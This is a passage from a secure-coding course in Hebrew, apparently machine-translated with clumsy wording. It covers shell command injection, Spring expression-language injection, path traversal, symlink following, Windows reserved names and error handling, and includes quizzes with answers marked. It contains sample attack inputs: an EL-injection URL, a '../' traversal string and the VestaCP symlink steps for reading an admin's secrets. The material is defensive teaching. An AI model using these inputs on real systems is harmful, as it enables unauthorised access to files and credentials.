מעטפת היא תוכנית המקבלת פקודות ישירות ומפעילה תוכניות כפקודה. מכיוון שזה שימושי, שפות תכנות רבות מקלות על הקריאה למעטפת. בפרט, לשפות רבות יש דרך לבנות באופן דינמי קריאה למעטפת ולאחר מכן לבצע אותה. עם זאת, קל לעשות טעויות בעת שילוב נתוני התוקף לתוך פקודה להיות מופעל על ידי פגז. בפרט, נסה להימנע מיצירה דינמית של תערובת של פקודות ונתונים שסופקו על-ידי התוקף כדי שיבוצעו על-ידי המעטפת. במקום זאת, נסה למצוא חלופה קלה יותר לשימוש מאובטח.

אם כל מה שאתה רוצה לעשות הוא להתקשר לתוכנית אחרת ולהעביר אותה כמה פרמטרים, נסה לעשות זאת מבלי ליצור באופן דינמי ולאחר מכן לפרש פקודת פגז בכלל! במקום זאת, נסה להתקשר ישירות לתוכנית. זה ממילא יעיל יותר, וזה הרבה יותר קל (וסביר יותר) להיות מאובטח אם אחד מהפרמטרים האלה עשוי לכלול נתונים מהתוקף. לדוגמה:

* ב-C, העדיפו **את execve**(3) (הוא לא משתמש בקליפה) במקום להשתמש **במערכת(3) (**שכן משתמשת במעטפת).

* בפייתון, העדיפו להשתמש ב-shell**=False (ברירת המחדל) עם ** subprocess.run() או subprocess.call**(), במקום להשתמש **ב-shell=True** או ****os.system()** ****

* בצומת JavaScript.js, העדיפו  להשתמש ב-shell=False (**ברירת המחדל) עם ** child_process.spawn() או child_process.execFile()  במקום להשתמש **ב-shell=True** או **** **child_process.exec**()****

בקיצור: אם אתה רואה קוד שמשרשר מחרוזות (כולל מחרוזות מעוצבות) לביצוע על ידי מעטפת, ושרשור זה כולל קלט לא מהימן, היה מודאג מאוד. אמנם ניתן לעשות זאת בצורה מאובטחת, אך עדיף להימנע מכך כאשר אתה יכול באופן סביר.

אם עליך להתקשר לתוכנית באמצעות מעטפת, וגם לכלול נתונים מסוימים שעשויים להיות מסופקים על-ידי תוקף, עליך להשתמש בה באופן מאובטח. זה בעצם די מסובך. כמו תמיד, *אין להשתמש ברשימת הכחשה*. יש הרבה "רשימות של מטא-דמויות פגז" שהן שגויות כי הן מפספסות כמה. אז אם אתה שולח נתונים דרך פגז, אתה צריך לברוח מכל תו למעט אלה ברשימת ההיתרים (תווים שאתה יודע שהם *לא* metacharacters). בדרך כלל, A-Z, a-z, ו- 0-9 אינם metacharacters, ולאחר מכן, לבדוק בזהירות רבה. הקפד לצטט הכל לפי הצורך.

כמובן, אם אתה מתקשר לתוכנית עם נתונים כלשהם שעשויים להיות מתוקף, עליך לוודא שהנתונים לא יתפרשו באופן שגוי. לדוגמה, ודא שאפשרויות שורת הפקודה שלך יפורשו כהלכה; אם תוקף יכול לגרום לתו ההתחלתי להיות "**-" או "**/**"** בפרמטר, הם עלולים להתפרש בטעות כאפשרות או כספריית בסיס. יש לחמוק בזהירות מכל דבר שעובר פנימה (למשל, לפי פרמטר או כל דבר אחר) כדי למנוע התקפה. זה מביא אותנו לנושא של שמות קבצים, אשר נסקור הבא.

 הזרקת פקודות מערכת ההפעלה היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2019 CWE Top 25 #11 ו- 2021 CWE Top 25 #5. זהו [CWE-78](https://cwe.mitre.org/data/definitions/78.html), *נטרול לא תקין של אלמנטים מיוחדים המשמשים בפקודת מערכת ההפעלה ('הזרקת פקודת מערכת ההפעלה'*).

#### חידון 3.3: הזרקת פקודת מערכת ההפעלה (פגז)

\>\>הימנע מלקרוא שלא לצורך למעטפת מערכת הפעלה כאשר ברצונך פשוט להפעיל תוכנית אחרת. אמת או שקר?<<

(x) נכון

( ) לא נכון

[הסבר]

זה נכון. לא רק שזה יעיל יותר, אבל פגז מערכת ההפעלה בדרך כלל מגיב למספר רב של תווים מיוחדים כי תצטרך להתמודד עם כדי להשתמש בו בצורה מאובטחת. אם אינך זקוק לפונקציות הנוספות שלו, אין טעם להתקשר דרכו. כמובן, ייתכנו מקרים שבהם היכולות הנוספות שלה הן בעלות ערך עבורך; במקרים אלה, יהיה עליך להיות זהיר מאוד ולברוח ממטא-תווים כדי להבטיח שהנתונים לא יתפרשו באופן שגוי.

[הסבר]

### התקפי הזרקה אחרים

ישנם סוגים רבים אחרים של התקפות הזרקה מעבר להזרקת SQL והזרקת פקודות של מערכת ההפעלה. ייתכן שקיים סיכון להתקפת הזרקה בכל פעם שאתה שולח נתונים הנשלטים חלקית על ידי משתמש לא מהימן בפורמט בעל מטא-תווים, מוגדר כשפה ו/או מעובד על ידי מתורגמן.

דוגמאות שבהן עלול להיות סיכון לפגיעות בהזרקה כוללות יצירה ושליחה של פקודות JSON, yaml, XML, Lightweight Directory Access Protocol (LDAP) ותבניות רבות אחרות לספריות, מסגרות ורכיבים אחרים שאתה תלוי בהם, וכן פלט שלהם למשתמשים בסופו של דבר. בכל המקרים, פתרון אחד הוא להשתמש ב- API שבורח באופן אוטומטי מהטקסט לפי הצורך, בדיוק כמו שימוש במשפטים עם פרמטרים בעת יצירת SQL.

וריאציה מעניינת אחת של התקף הזרקה מתרחשת כאשר ביטוי כלשהו מבוצע פעמיים שלא במתכוון. זה יכול להתרחש, למשל, בשימושים מסוימים של שפת הביטוי במסגרת Java האביב הנפוץ, שם ההתקפה נקראת הזרקת שפת ביטוי. פגיעות זו נפוצה להפליא, ולכן נסביר אותה בהמשך כאן.

"שפת ביטוי" (EL) פותחה כחלק מספריית התגים הסטנדרטיים של Java Server Pages (JSTL) כדי להקל על קבלת נתונים ממודל האובייקטים הבסיסי. לדוגמה, זה:

> `<c:out value="person.address.street"/>`

הוא קיצור נוח עבור:

> `<%=HTMLEncoder.encode(((Person)person).getAddress().getStreet())%>`

הבעיה היא שבמקרים מסוימים ניתן לפרש את ה-EL פעמיים בעת שימוש ב-Spring בהינתן גרסאות ותצורות מסוימות. לדוגמה, התגים `<spring:message>` עשויים `<spring:theme>` לפרש פעמיים את התכונות הבאות: `arguments`, `code` , , ,  `text` `var`, `scope`ו- `message`. לדוגמה נוספת, `<spring:bind>` ויכול `<spring:nestedpath>` לפרש פעמיים את התכונה `path`. כאשר זה קורה, כפי שצוין[ "קוד מרוחק עם הזרקת שפת ביטוי](http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/)" על ידי Amodio (2012), היא כי בקשה של הטופס:

> `http://vulnerable.com/foo?message=${applicationScope}`

לדף המכיל:

> `<spring:message text="" code="${param['message']}"></spring:message>`

עלול לגרום לפלט המכיל מידע פנימי של השרת, כולל ספריות classpath וספריות עבודה מקומיות.

השאלה אם הבעיה מתרחשת או לא תלויה בגרסת Spring, בגורם המכיל של Java Server Pages /Servlet (אם קיים) ובכמה אפשרויות תצורה. למידע נוסף, ראו "הזרקת שפת ביטוי" מאת [די פאולה ודבירסיאגי (2011) ו"[](https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf)קוד מרחוק עם הזרקת שפת ביטוי[" מאת Amodio (2012).](http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/)

ברור שחשוב לוודא שביטויים מוערכים רק כמה פעמים כצפוי (בדרך כלל פעם אחת). כדאי לוודא שהתצורה עושה זאת, אם יש חלופה אפשרית. אם יש חששות כלשהם, כלול בדיקות בחבילת הבדיקות האוטומטית שלך כדי לוודא שביטויים מוערכים פעם אחת בלבד בהקשרים בטוחים, כך שכל טעות עתידית תזוהה מיד לפני השימוש בייצור. במקרה של אביב, בדיקה יכולה לספק נתונים כמו `${99999+1}` במבנה מסוכן ואז לוודא שטקסט התגובה הוא הצפוי (ולא `100000`).

 2021 CWE Top 25 #30 הוא [CWE-917](https://cwe.mitre.org/data/definitions/917.html), *נטרול לא תקין של אלמנטים מיוחדים המשמשים בהצהרת שפת ביטוי ('הזרקת שפת ביטוי'*).


### שמות קבצים (כולל מעבר נתיב וקישור הבא)

מבחינה טכנית, "**שם נתיב**" הוא רצף של בתים המתאר כיצד למצוא אובייקט מערכת קבצים. במערכות דמויות יוניקס, כולל לינוקס, אנדרואיד, MacOS ו-iOS, שם נתיב הוא רצף של שם קובץ אחד או יותר המופרדים על-ידי "/" אחד או יותר****. במערכות Windows, שם נתיב מסובך יותר אך הרעיון זהה. בפועל, אנשים רבים משתמשים במונח "שם קובץ" כדי להתייחס לשמות נתיבים.

שמות נתיבים נשלטים לעתים קרובות, לפחות באופן חלקי, על-ידי משתמש לא מהימן. לדוגמה, לעתים קרובות שימושי להשתמש בשמות קבצים כמפתח לזיהוי נתונים רלוונטיים, אך הדבר עלול להוביל לכך שמשתמשים לא מהימנים ישלטו בשמות קבצים. דוגמה נוספת היא בעת ניטור או ניהול של מערכות משותפות (למשל, מכונות וירטואליות או מערכות קבצים מכולות); במקרה זה, מפקח לא מהימן שולט בשמות קבצים. גם כאשר תוקף לא אמור להיות מסוגל להשיג סוג כזה של שליטה, לעתים קרובות חשוב להתמודד עם סוג זה של בעיה כאמצעי הגנה לעומק, כדי להתמודד עם תוקפים שמקבלים כמות קטנה של שליטה.



#### חציית נתיב

מקרה ברור הוא שלעתים קרובות מערכות אינן אמורות לאפשר גישה מחוץ לספרייה כלשהי (למשל, "שורש מסמך" של שרת אינטרנט). לדוגמה, אם תוכנית מנסה לגשת לנתיב שהוא שרשור של "**trusted_root_path**" ו- "**שם משתמש", ייתכן שהתוקף יוכל ליצור שם משתמש ".** .**/.. /.. /mysecrets**" ולסכל את המגבלות. פגיעות זו, שבה תוקף יכול ליצור שמות קבצים החוצים מחוץ למקום שבו הוא אמור לעבור, היא כה נפוצה עד שיש לה שם: *פגיעויות חציית ספריות*. כמו תמיד, השתמש ברשימת היתרים מוגבלת מאוד לקבלת מידע שישמש ליצירת שמות קבצים. אם רשימת ההיתרים של יישום האינטרנט שלך אינה כוללת "**. ", "**/", "**~**", ו-**"**&#92;**** ", ברוב המערכות קשה יותר באופן משמעותי לחצות מחוץ לשורש הספרייה המיועד. פתרון נפוץ נוסף הוא להמיר נתיב יחסי לנתיב מוחלט מנורמל באופן שמבטל את כל ".**.** " משתמש ולאחר מכן ודא שהנתיב המתקבל עדיין נמצא באזור הנכון של מערכת הקבצים.

>  שעת סיפור: סולטסטאק

> דוגמה לפגיעות של חציית ספריות היא [CVE-2020-11652](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11652), פגיעות ב- SaltStack. SaltStack הוא כלי לניהול תצורה ותזמור לניהול תשתיות מרובות מחשבים. בפגיעות זו, שיטה נכשלה בחיטוי כראוי של פרמטר קלט, המאפשר ".**.** " רכיבים ששימשו ליצירת שם קובץ. התוצאה הייתה שהתוקפים יכלו לגרום לקבוצות שלמות של מכונות לבצע פקודות לפי בחירתם.

 חציית נתיב היא סיבה כה נפוצה לפגיעויות אבטחה שהיא 2021 CWE Top 25 #8 ו- 2019 CWE Top 25 #10. הוא מזוהה גם כ- [CWE-22](https://cwe.mitre.org/data/definitions/22.html), *הגבלה לא נאותה של שם נתיב לספרייה מוגבלת ('חציית נתיב')*.

#### שמות נתיבים של חלונות

שמות נתיבים של Microsoft Windows יכולים להיות קשים מאוד להתמודדות מאובטחת. פרשנויות שמות הנתיבים של Windows משתנות בהתאם לגירסת Windows ול- API שבו נעשה שימוש (קריאות רבות משתמשות ב- **CreateFile** התומך בקידומת שם הנתיב "\**\.&#92;** " - ואלה מפרשים שמות נתיבים באופן שונה מהקריאות האחרות שאינן). אולי הכי ברור, "**מכתב:**" ו"**\\שרת\שיתוף...** " יש משמעות מיוחדת ב- Windows. בעיה נבזית יותר היא שיש שמות קבצים שמורים, שצורתם תלויה ב- API שבו נעשה שימוש ובתצורה המקומית. שמות המכשירים השמורים המובנים הם כדלקמן: CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 ו- LPT9. גרוע מכך, נהגים יכולים ליצור שמות שמורים יותר - כך שלמעשה אינך יכול לדעת מראש אילו שמות שמורים. עליך להימנע מיצירת שמות קבצים עם שמות שמורים, הן עם וללא סיומת; אם תוקף יכול לגרום לתוכנית לקרוא/לכתוב את השם (לדוגמה, **com1.txt**), הוא עלול (בהתאם ל-API) לגרום לקריאה או כתיבה להתקן במקום לקובץ. במקרה זה, אפילו אלפאנומריים פשוטים יכולים לגרום לאסון ולפרש כמטא-תווים - זה נדיר, שכן בדרך כלל אלפאנומריים בטוחים. Windows תומך ב- "**/**" כמפריד ספריות, אך הוא משתמש באופן מסורתי ב- "**&#92;** " כמפריד הספריות (וזה מעצבן כי **&#92;**  נמצא בשימוש נרחב כדמות בריחה). ב- Windows, אל תסיים שם קובץ או ספריה ברווח או בנקודה; מערכת הקבצים הבסיסית עשויה לתמוך בה, אך מעטפת Windows וממשק המשתמש בדרך כלל אינם תומכים בכך. לקבלת פרטים נוספים, עיין בתיעוד של Microsoft Windows בנושא [*מתן שמות לקבצים, נתיבים ומרחבי שמות*](https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file?redirectedfrom=MSDN).

#### Unix/Linux Pathnames

גם שמות קבצים ושמות נתיבים במערכות דמויות יוניקס לא תמיד קלים להתמודדות. ברוב המערכות דמויות יוניקס, שם קובץ יכול להיות כל רצף של בתים שאינו כולל **\0** (שליחות קטלנית) או קו נטוי. תפיסה מוטעית נפוצה אחת היא ששמות קבצים של יוניקס הם מחרוזת של תווים. שמות קבצים של Unix אינם מחרוזת של תו אחד או יותר; הם רק רצף של בתים, ולכן שם קובץ לא צריך להיות רצף משפטי של תווים. לדוגמה, למרות שזו מוסכמה נפוצה לפרש שמות קבצים כקידוד UTF-8 של תווים, רוב המערכות אינן אוכפות זאת בפועל. ואכן, הם נוטים לאכוף דבר, כך שניתן ליצור שמות קבצים בעייתיים רבים, כולל שמות קבצים עם רווחים (או רק רווחים), תווי בקרה (כולל שורה חדשה, כרטיסייה, בריחה וכו '), בתים שאינם חוקיים UTF-8, או

כולל "-**" מוביל** (הסמן לאפשרויות פקודה). שמות קבצים בעייתיים אלה עלולים לגרום לבעיות מאוחר יותר.

חלק מהבעיות הפוטנציאליות בשמות קבצים הן ספציפיות למעטפת, אך בעיות בשמות קבצים אינן מוגבלות למעטפת. בעיה נפוצה היא ש- "**-**" הוא דגל האפשרויות עבור פקודות רבות, אך זוהי התחלה חוקית של שם קובץ.

פתרון פשוט הוא להקדים את כל הגושים או שמות הקבצים במידת הצורך ב- "**./**" כך שהם לא יוכלו להתחיל ב- "**-**". כך למשל, לעולם אל תשתמש ב-"**&#42;. pdf**" כדי להתייחס לערכת מסמכי PDF אם תוקף עלול להשפיע על שמות הקבצים של ספרייה; השתמש ב- ".**/&#42;. pdf**".

היזהר מהצגה או אחסון של שמות נתיבים, מכיוון שהם יכולים לכלול שורות חדשות, כרטיסיות, בריחה (שיכולה להתחיל פקדי מסוף) או רצפים שאינם מחרוזות משפטיות. במערכות מסוימות, רק הצגת שמות קבצים יכולה להפעיל פקדי מסוף, שיכולים לאחר מכן להפעיל פקודות עם ההרשאה של זו המוצגת.

#### טיפול בקבצים (כולל קישור בהמשך)

ברגע שיש לך שם נתיב, לעתים קרובות ברצונך לבצע איתו פעולה כלשהי, כגון ניסיון לפתוח קובץ זה.

כפי שנדון ב["היזהר מתנאי מרוץ",](#beware-of-race-conditions) פתח קבצים בדרכים המונעות תנאי מרוץ של זמן בדיקה (TOCTOU). פתח קובץ ישירות במקום לבצע שאילתה אם הגישה מותרת (מכיוון שהדבר עשוי להשתנות). כלול את האפשרות "בלעדי" ("<tt>x</tt>" או `O_EXCL`) אם ברצונך לדרוש במפורש שהקובץ ייווצר. אם אתה יוצר קבצים זמניים, השתמש בממשקים שתוכננו במיוחד כדי ליצור קבצים זמניים באופן מאובטח.

אם התוכנה שלך עשויה לפתוח אובייקט מערכת קבצים (כולל ספריה) שתוקף עשוי לשלוט בו, היה מוכן לכך. אחת הדרכים שבהן זה יכול לקרות שעדיין לא דנו בה היא פתרון קישורים לא תקין.

רוב מערכות ההפעלה תומכות ב"קישורים קשיחים" וב"קישורים סמליים"... אבל מפתחים רבים לא יודעים עליהם או לא לוקחים בחשבון אותם. "קישור קשיח" יוצר שם אחר המתייחס לאותו אובייקט בסיסי של מערכת הקבצים, עם אותה בעלות והרשאות. "קישור סמלי" (aka "symlink" או "קישור רך") הוא קובץ מיוחד המכיל הפניה לקובץ או ספרייה אחרים בצורה של נתיב מוחלט או יחסי; ניסיון לפתוח את הקישור הסמלי ינותב מחדש כדי לפתוח את ההפניה במקום זאת. אלה יכולים להיות שימושיים מאוד. עם זאת, אם תוקף יכול ליצור קישורים אלה באובייקט מערכת קבצים שהיישום שלך עשוי לפתוח, גם קישורים אלה עלולים להוות בעיה ויישומים חייבים להיות מוכנים להתמודד איתם.

אתה צריך לכתוב קוד שמוכן לקישורים קשים וסמליים. בפרט, אל תניח כי כל הקבצים בספרייה הם בהכרח בבעלות הבעלים של הספרייה. אם לתוכנית שלך יש הרשאות מלאות, ייתכן שיהיה עליך לשחרר הרשאות אלה באופן זמני לפני הטיפול במערכת הקבצים. ניתן גם לפתוח קבצים באמצעות האפשרות `O_NOFOLLOW` במערכות דמויות יוניקס; פעולה זו משביתה את הקישורים הבאים ברכיב שם הקובץ האחרון (שם הבסיס), אך רק ברכיב האחרון, ובשפות תכנות מסוימות נדרשים צעדים נוספים כדי להשתמש באפשרות זו.

גירסאות מודרניות של Windows תומכות בקישורים קשיחים ובקישורים סמליים. עם זאת, יצירתם דורשת בדרך כלל הרשאות גבוהות יותר (למשל, מצב מנהל או מפתח) ולכן הסבירות שהם מעט פחות כשיטת תקיפה בהשוואה למערכות דמויות יוניקס. פגיעויות מסוג זה עדיין מתרחשות במערכות Windows מכיוון שמשתמשים מורשים יכולים ליצור אותן ויישומים מסוימים אינם מתוכננים להשתמש בהן כראוי, מה שמוביל לפגיעויות הניתנות לניצול.

ישנם שני אמצעים נפוצים שניתן לנקוט במערכות דמויות יוניקס כדי להקשיח אותן מפני סוגים רבים של התקפות מבוססות קישורים, אם כי הם אינם מנטרלים את כל ההתקפות:

1. כל הספריות הניתנות לכתיבה על ידי משתמשים מרובים צריכות לכלול גם את ערכת הסיביות "הדביקה". ברוב המערכות המודרניות דמויות יוניקס, ספריה עם ערכת סיביות "דביקה" מגבילה את השינויים המותרים בספריה. לדוגמה, במערכות לינוקס, המשמעות של סיבית דביקה היא עבור כל קובץ בספריה זו, רק הבעלים של הקובץ, הבעלים של הספריה או משתמש הבסיס יכולים לשנות את שם הקובץ או למחוק אותו. בדרך כלל במערכות דמויות יוניקס הכנסה ושינוי שמות של קבצים בספרייה יכולים להיעשות על ידי כל המשתמשים עם הרשאת כתיבה בספרייה, ללא קשר לבעל הקובץ. הסיבית הדביקה בדרך כלל כבר מוגדרת עבור ספריות משותפות קיימות מראש, כגון `/tmp` אך עליך להגדיר במיוחד את הסיבית הדביקה אם אתה יוצר ספריות חדשות שבהן הכתיבה משותפת בין משתמשים. הסיבית הדביקה הופכת סוגים מסוימים של התקפות לקשות יותר לביצוע, כולל כאלה המבוססות על יצירה או שינוי של קישורים בספריה זו.
2. היכן שזמין, הפעל "קישורים סימבוליים דביקים מוגנים" (aka `protected_symlinks`). במערכות עם קישורים סימבוליים דביקים מוגנים, קישור סימבולי מתבצע רק אם הוא נמצא מחוץ לספרייה דביקה הניתנת לכתיבה עולמית, או כאשר ה-uid של ה-symlink והעוקב תואם, או כאשר בעל הספריה תואם את הבעלים של ה-symlink.  הפצות לינוקס רבות מאפשרות זאת כברירת מחדל, כולל אובונטו, פדורה ו-Red Hat Enterprise Linux.

>  שעת סיפור: קישור VestaCP בעקבות פגיעות (CVE-2021-30463)

> VestaCP הוא לוח בקרה מארח קוד פתוח (המאפשר למשתמשים בשירות אירוח לנהל את חבילת האירוח שלהם, למשל, לרכוש שמות דומיין, להתקין יישומים, ליצור ולנהל חשבונות דוא"ל ולהעלות קבצי אתר).  למרבה הצער, VestaCP דרך גרסה 0.9.8-24 מאפשר לתוקפים לקבל הרשאות על ידי יצירת קישורים סימבוליים לקבצים שעבורם אין להם הרשאות, פגיעות שזוהתה כ- [CVE-2021-30463](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-30463).

הבעיה הבסיסית היא שיישום VestaCP הניח שכל הקבצים תחת ספריית הבית של המשתמש (במישרין או בעקיפין) היו בהכרח בבעלות ובשליטת המשתמש. אבל זה לא בהכרח נכון במערכות הפעלה מודרניות. ברוב המכריע של מערכות ההפעלה המודרניות, קישורים קשיחים וסמליים מאפשרים להפנות אליהם קבצים אחרים.

פרטי התקפה זו תוארו כדלקמן ([גילוי SSD, ייעוץ SSD – פגיעויות VestaCP LPE, 20 במרץ 2021](https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/)). תוקף יכול לגשת לספריית האינטרנט של המשתמש שלו בתוך ספריית הבית שלו וליצור ספרייה עם שם הדומיין שהוא רוצה לתקוף (לדוגמה, *pwned.pwn*) הנשלטת על-ידי המערכת. בתוך ספרייה זו, התוקף היה יוצר ספרייה אחרת בשם `public_xhtml`. ובתוך `public_xhtml` התוקף היה יוצר קישור סימבולי (  למשל, *pwn.pwn*) לקובץ הרצוי שהתוקף רצה לקרוא, למשל, את סוד הכניסה בקובץ user.conf של חשבון מנהל המערכת. גם בספרייה של התחום, *pwned.pwn*, התוקף היה יוצר קישורים סימבוליים לתיקיות שלתוקף אין הרשאה לגשת אליהן, למשל, `/usr/local/vesta/data/users` ו`/usr/local/vesta/data/users/admin`- . לאחר מכן, התוקף יכול להפעיל את הפגיעות על-ידי יצירת תחום עם השם *pwned.pwn* בכתובת ה-URL /add/web של VestaCP. התוקף יכול כעת לקרוא את התוכן הסודי של user.conf של מנהל המערכת, מה שמאפשר לתוקף לשנות את סיסמת מנהל המערכת.


 2021 CWE Top 25 #31 הוא [CWE-59](https://cwe.mitre.org/data/definitions/59.html), רזולוציית קישור לא נכונה לפני גישה לקובץ ('קישור עוקב').

#### חידון 3.4: שמות קבצים (כולל חציית נתיב וקישור הבא)

\>\>בחר את כל המשפטים הנכונים.<<

[!] ביוניקס ובלינוקס, שמות קבצים הם רצף של תווים. {{ נבחר: לא, באופן כללי שמות קבצים ביוניקס ובלינוקס הם רצף של בתים, שעשויים למפות או לא למפות תווים ספציפיים כלל. כמה יישומים ספציפיים ומערכות קבצים דורשים שמות קבצים להיות רצף של תווים, אבל זה לא נכון כהצהרה כוללת. }}

[x] ביוניקס ובלינוקס, שמות קבצים עשויים להכיל תווי בקרה.

[x] ביוניקס ובלינוקס, שמות קבצים עם תווי "**-**" מובילים יכולים להוות בעיית אבטחה. פתרון פשוט הוא קידומת globs עם "**./**" כך שהתו הראשון לא יכול להיות "**-**".

[x] חציית נתיב מתרחשת כאשר תוקף יכול ליצור שמות קבצים החוצים מחוץ למקום שבו הם אמורים לעבור, לדוגמה, על-ידי הטבעה "**/.. /**". דרך טובה להתמודד עם זה היא להשתמש ברשימת היתרים מוגבלת שמונעת את ההתקפות האלה.

## התקשרות לתוכניות אחרות: נושאים אחרים

### התקשר לממשקי API עבור תוכניות ובדוק מה מוחזר

בעת כתיבת תוכניות, נסה לקרוא רק לממשקי תיכנות יישומים (API) המיועדים לשימוש על-ידי תוכניות.

בדרך כלל תוכנית יכולה להפעיל כל תוכנית אחרת, כולל אלה שבאמת נועדו רק לאינטראקציה אנושית. עם זאת, זה בדרך כלל לא חכם להפעיל תוכנית המיועדת לאינטראקציה אנושית באותו אופן שבו אדם היה עושה. הבעיה היא שהממשקים האנושיים של התוכניות עשירים בפונקציונליות במכוון ולעתים קרובות קשה לשלוט בהם לחלוטין. לדוגמה, תוכניות אינטראקטיביות כוללות לעתים קרובות קודי "בריחה", שעלולים לאפשר לתוקף לבצע פונקציות לא רצויות. כמו כן, תוכניות אינטראקטיביות מנסות לעתים קרובות לאינטואיציה של ברירות המחדל "הסבירות ביותר"; ייתכן שזו לא ברירת המחדל שציפית לה, ותוקף עשוי למצוא דרך לנצל זאת.

בדרך כלל ישנם פרמטרים המעניקים לך גישה בטוחה יותר לפונקציונליות של התוכנית, או API או יישום אחר המיועד לשימוש על-ידי תוכניות; השתמש בהם במקום זאת.

גם זה הולך בכיוון ההפוך. אם אתה מפתח אפליקציה עם ממשק משתמש אינטראקטיבי לבני אדם, ודא שיש דרך שבה תוכנית יכולה לגשת ישירות גם לפונקציונליות זו. זה יקל הרבה יותר לשלב את היישום שלך למשהו גדול יותר.

כמובן, ברגע שאתה מקבל מידע, הקפד לבדוק אם יש תנאי שגיאה (או ישירות או באמצעות העלאת חריג). אם בקשה עם נתונים לא מהימנים נכשלת, התוכנית שלך לא צריכה פשוט להמשיך בלית ברירה כאילו היא הצליחה. טיפול בשגיאות הוא נושא כל כך חשוב שנתייחס לזה בהמשך.

#### חידון 3.5: התקשר לממשקי API עבור תוכניות ובדוק מה מוחזר

\>\>מתוך תוכנית, נסה להשתמש באותו API המשמש בני אדם, מכיוון שניתן לבדוק זאת טוב יותר. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

זה לא נכון. זה יקשה הרבה יותר על כתיבת קוד (ולעדכן אותו מאוחר יותר). חשוב מכך, ממשקים אנושיים משתנים לעתים קרובות או מבצעים ניחושים שאינם הולמים כאשר מנסים להפוך משהו לאוטומטי.

[הסבר]

### טיפול בשגיאות

תוכניות אמיתיות חייבות לטפל בשגיאות. תוכניות הפקה רבות הן *בעיקר* טיפול בשגיאות, כי יש כל כך הרבה בעיות שיכולות לקרות בעולם האמיתי.

טיפול לקוי בשגיאות עלול להוביל לפגיעויות אבטחה. אז בואו נדון בגישות נפוצות לטיפול בשגיאות וכיצד להשתמש בהן בצורה מאובטחת. בעיקרון, זה כרוך בהבנת החוזקות והחולשות שלהם, וזהירות לגבי החולשות שלהם בעת השימוש בהם.

>  שעת סיפור: אפל  goto **להיכשל; goto להיכשל;**

> דוגמה לפגיעות אבטחה הנגרמת על-ידי טיפול גרוע בשגיאות היא [CVE-2014-1266](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1266), המכונה בדרך כלל "*goto fail; goto להיכשל;* " פגיעות. זו הייתה נקודת תורפה ביישום אפל של פרוטוקול SSL/TLS בגרסאות רבות של מערכות ההפעלה שלה. הבעיה היתה שנייה (כפולה) "**goto להיכשל;** " הצהרה בפונקציה **SSLVerifySignedServerKeyExchange**, כדלקמן:

~~~~C
    if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
      goto fail;
    goto fail;
    ... other checks ...
    fail:
      ... buffer frees (cleanups) ...
      return err;
~~~~

> ההזחה כאן מטעה; מכיוון שאין סוגריים מסולסלים לאחר  משפט **IF**, "**goto fail**" השני מבוצע תמיד. בהקשר זה, פירוש הדבר היה שדילג על קוד בדיקת חתימות חיוני, כך שגם חתימות רעות וגם טובות יתקבלו. ה"**גוטו**" החיצוני גרם לפונקציה להחזיר 0 ("אין שגיאה") כאשר שאר הבדיקה דילגה; כתוצאה מכך, אישורים לא חוקיים התקבלו בשקט כתקפים. זו הייתה נקודת תורפה הרת אסון, שכן פירוש הדבר היה שכל מיני אישורים לא חוקיים יתקבלו, תוך פגיעה מוחלטת באבטחה. פגיעות זו תזוהה בקלות על ידי חבילת בדיקות אוטומטית. ([*פגיעות הכישלון של אפל goto: לקחים שנלמדו, *](https://dwheeler.com/essays/apple-goto-fail.html)מאת דיוויד א. וילר, 2020).

#### קודי החזרה

אחד המנגנונים הנפוצים ביותר לטיפול בשגיאות הם קודי החזרה. קוד החזרה הוא פשוט ערך יחיד שהוא ** ערך  ההחזרה של שיטה/פונקציה/פרוצדורה או ערך המציין שגיאה. לדוגמה, "על הצלחה מחזירה 0..INT_MAX, על החזרי שגיאה -1" או "על הצלחה מחזירה מצביע, על שגיאה מחזירה NULL". במקרים מסוימים, שום דבר לא מוחזר (לפחות כערך ההחזרה שלו), כך שערך ההחזרה הוא פשוט אם הייתה שגיאה או לא. קודי החזרה הם הגישה הרגילה ב- C, אך קודי החזרה משמשים בשפות תכנות רבות.

ברור, כאשר אתה מפתח תוכנית, אתה צריך להבטיח כי קוד ההחזרה אינו ערך לגיטימי, כך שגיאות וערכים נורמליים *ניתן* להבחין.

קודים חוזרים פועלים, אך יש להם בעיות רבות בעת תחזוקת תוכנה לאורך זמן:

* הם דורשים מהמתקשר לבדוק כל ערך החזרה עבור שגיאה כדי לטפל בו. קל לשכוח אותם, ולכן זו טעות נפוצה.

* לכל שיטה עשויה להיות סמנטיקה שונה (למשל, ערכים שונים לציון "שגיאה"). לעתים קרובות הם **0**, שליליים**, **INT_MAX**, **NULL** **או ערך מיוחד אחר... אבל לא תמיד.

* אם מתווספים סוגים חדשים של שגיאות, עליך לבדוק לעתים קרובות כל מתקשר כדי לוודא שהן מטופלות כראוי.

* הם מובילים לכך שהלוגיקה הפונקציונלית והטיפול בשגיאות מתערבבים זה בזה. זה יוצר לעתים קרובות קוד מורכב יותר, מה שמוביל לטעויות ופרודוקטיביות ירודה יותר. בפרט, קוד כזה לעתים קרובות נכשל בהקצאת משאבים אם הוא חייב לעשות זאת.

